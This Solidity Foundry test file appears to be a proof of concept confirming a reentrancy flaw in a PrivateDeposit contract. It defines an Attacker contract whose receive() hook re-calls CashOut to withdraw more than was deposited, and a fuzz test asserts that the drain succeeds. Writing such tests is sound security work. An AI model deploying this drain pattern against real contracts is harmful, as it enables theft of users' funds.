
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {
    PrivateDeposit public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PrivateDeposit();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);
        vm.assume(attackVal % 1 ether == 0);

        uint256 depositAmount = attackVal;
        uint256 withdrawAmount = attackVal;

        vm.deal(address(_contractUnderTest), depositAmount * 2);
        vm.deal(address(_attacker), depositAmount * 2);
        vm.deal(address(this), depositAmount * 2);

        _attacker.setupAttack{value: depositAmount}(depositAmount, withdrawAmount);
        _attacker.attack(withdrawAmount);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateDeposit public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedWithdrawAmount;

    constructor(address victimAddress) {
        _victim = PrivateDeposit(victimAddress);
    }

    function setupAttack(uint256 depositAmount, uint256 withdrawAmount) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: depositAmount}();
        storedWithdrawAmount = withdrawAmount;
    }

    function attack(uint256 withdrawAmount) public {
        require(withdrawAmount == storedWithdrawAmount, "Withdraw amount mismatch");
        
        initialSnapshot = address(this).balance;
        _victim.CashOut(withdrawAmount);
        
        uint256 finalBalance = address(this).balance;
        if (finalBalance > initialSnapshot + withdrawAmount) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            _victim.CashOut(storedWithdrawAmount);
            attackCallCount++;
        }
    }
}
